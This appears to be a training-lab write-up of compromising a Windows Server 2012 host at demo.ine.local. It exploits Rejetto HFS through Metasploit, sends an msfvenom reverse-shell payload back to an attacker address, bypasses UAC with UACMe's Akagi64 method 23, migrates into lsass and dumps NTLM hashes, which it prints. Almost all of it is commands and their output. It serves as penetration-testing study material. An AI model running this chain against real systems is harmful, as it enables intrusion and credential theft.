## UAC Bypass: UACMe

### Target
`demo.ine.local`

### Tools:
* `searchsploit`
* `UACme`

### Objective: 
Gain the highest privilege on the compromised machine and get admin user NTLM hash.

---
```bash
┌──(root㉿INE)-[~]
└─# nmap -Pn demo.ine.local
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-22 06:40 IST
Nmap scan report for demo.ine.local (10.3.21.222)
Host is up (0.0044s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 1.35 seconds
```
```bash
┌──(root㉿INE)-[~]
└─# nmap -Pn demo.ine.local -sV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-22 06:40 IST
Nmap scan report for demo.ine.local (10.3.21.222)
Host is up (0.0030s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
80/tcp    open  http               HttpFileServer httpd 2.3
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.67 seconds
```
```bash
┌──(root㉿INE)-[~]
└─# searchsploit HFS | grep Metasploit                                                                                                                                                     
Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)                                                                                   | windows/remote/34926.rb
```
```bash
msf6 > search rejetto

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
```
```bash
msf6 exploit(windows/http/rejetto_hfs_exec) > setg RHOSTS demo.ine.local
RHOSTS => demo.ine.local
msf6 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.10.40.5:4444 
[*] Using URL: http://10.10.40.5:8080/0Ou9kq0L2nLEN
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /0Ou9kq0L2nLEN
[*] Sending stage (176198 bytes) to 10.3.21.222
[!] Tried to delete %TEMP%\nGEbeehx.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.40.5:4444 -> 10.3.21.222:49247) at 2026-01-22 06:46:15 +0530
[*] Server stopped.

meterpreter > sysinfo
Computer        : VICTIM
OS              : Windows Server 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > getuid
Server username: VICTIM\admin
```
logged in as a local usergroup
```bash
meterpreter > getsystem
[-] priv_elevate_getsystem: Operation failed: All pipe instances are busy. The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
[-] Named Pipe Impersonation (RPCSS variant)
[-] Named Pipe Impersonation (PrintSpooler variant)
[-] Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)
```
```bash
C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>net localgroup administrators
net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
admin
Administrator
The command completed successfully.
```
```bash
┌──(root㉿INE)-[~]
└─# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.0.15  netmask 255.255.0.0  broadcast 10.1.255.255
        ether 02:42:0a:01:00:0f  txqueuelen 0  (Ethernet)
        RX packets 20721  bytes 1596309 (1.5 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 16228  bytes 5895896 (5.6 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.40.5  netmask 255.255.255.0  broadcast 10.10.40.255
        ether 02:42:0a:0a:28:05  txqueuelen 0  (Ethernet)
        RX packets 3106  bytes 265486 (259.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3348  bytes 887308 (866.5 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 102902  bytes 46157168 (44.0 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 102902  bytes 46157168 (44.0 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
```bash
┌──(root㉿INE)-[~]
└─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.40.5 LPORt=4444 -f exe > payload.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload                                                                                                                                               
Payload size: 354 bytes
Final size of exe file: 73802 bytes

┌──(root㉿INE)-[~]
└─# file payload.exe 
payload.exe: PE32 executable (GUI) Intel 80386, for MS Windows, 4 sections
```
```bash
meterpreter > ls
Listing: C:\Users\admin\AppData\Local\Temp
==========================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040777/rwxrwxrwx  0       dir   2026-01-22 06:50:59 +0530  1
100777/rwxrwxrwx  199168  fil   2026-01-22 07:01:56 +0530  Akagi64.exe
100777/rwxrwxrwx  73802   fil   2026-01-22 07:02:05 +0530  payload.exe
```
```bash
msf6 exploit(multi/handler) > set LHOST 10.10.40.5
LHOST => 10.10.40.5
msf6 exploit(multi/handler) > set PayLOAD windows/meterpreter/reverse_tcp
PayLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run
```
```bash
meterpreter > shell
Process 1276 created.
Channel 5 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\admin\AppData\Local\Temp>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AEDF-99BD

 Directory of C:\Users\admin\AppData\Local\Temp

01/22/2026  01:32 AM    <DIR>          .
01/22/2026  01:32 AM    <DIR>          ..
01/22/2026  01:20 AM    <DIR>          1
01/22/2026  01:31 AM           199,168 Akagi64.exe
01/22/2026  01:32 AM            73,802 payload.exe
               2 File(s)        272,970 bytes
               3 Dir(s)   8,272,326,656 bytes free

C:\Users\admin\AppData\Local\Temp>Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\payload.exe
Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\payload.exe
```
```bash
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.40.5:4444 
[*] Sending stage (176198 bytes) to 10.3.21.222
[*] Meterpreter session 1 opened (10.10.40.5:4444 -> 10.3.21.222:49319) at 2026-01-22 07:07:28 +0530

meterpreter > sysinfo
Computer        : VICTIM
OS              : Windows Server 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
```
LSASS = Local Security Authority Subsystem Service

Process name: lsass.exe

Runs as: NT AUTHORITY\SYSTEM

Purpose: authentication & security enforcement

What LSASS is responsible for

LSASS handles:

User logons (local & domain)

Password validation

NTLM & Kerberos authentication

Token creation

Security policy enforcement

👉 In simple terms:
If Windows needs to prove who you are, LSASS is involved.

```bash
meterpreter > ps -s lsass
Filtering on SYSTEM processes...
Filtering on 'lsass'

Process List
============

 PID  PPID  Name       Arch  Session  User                 Path
 ---  ----  ----       ----  -------  ----                 ----
 688  596   lsass.exe  x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\lsass.exe

meterpreter > miograte 688
[*] Migrating from 1724 to 688...
[*] Migration completed successfully.
meterpreter > 
```
```bash
meterpreter > hashdump
admin:1012:aad3b435b51404eeaad3b435b51404ee:4d6583ed4cef81c2f2ac3c88fc5f3da6:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:659c8124523a634e0ba68e64bb1d822f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
meterpreter > 
```
WE use akagi 23
Flag: **4d6583ed4cef81c2f2ac3c88fc5f3da6**